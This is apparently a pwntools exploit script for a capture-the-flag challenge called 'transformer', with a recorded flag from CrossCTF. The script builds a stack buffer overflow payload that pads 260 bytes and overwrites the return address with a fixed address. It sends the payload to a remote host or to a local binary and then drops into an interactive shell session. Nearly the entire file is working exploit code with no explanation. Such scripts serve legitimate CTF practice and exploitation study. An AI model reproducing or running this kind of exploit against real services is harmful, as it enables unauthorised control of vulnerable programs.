from pwn import *
import sys

LOCAL = True

HOST = '192.168.0.31'
PORT = 10006

# target 0x0804857b

def input(s):
    r.sendline(s)
    r.recvuntil("\n")

def exploit(r):
    #pad = "AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsA"
    pad = "A"*260
    payload = pack(0x0804857b)
    input(pad+payload)
    input(pack(0xdeadbeef))

    r.interactive()

    return

if __name__ == "__main__":

    if len(sys.argv) == 1:
        r = remote(HOST, PORT)
        exploit(r)
    else:
        r = process('/home/rootkid/CTF_shits/xctf2017/finals/tranform/transformer')
        print util.proc.pidof(r)
        pause()
        exploit(r)
    
#CrossCTF{G00DNIGHTST34LTHKN1GHT}
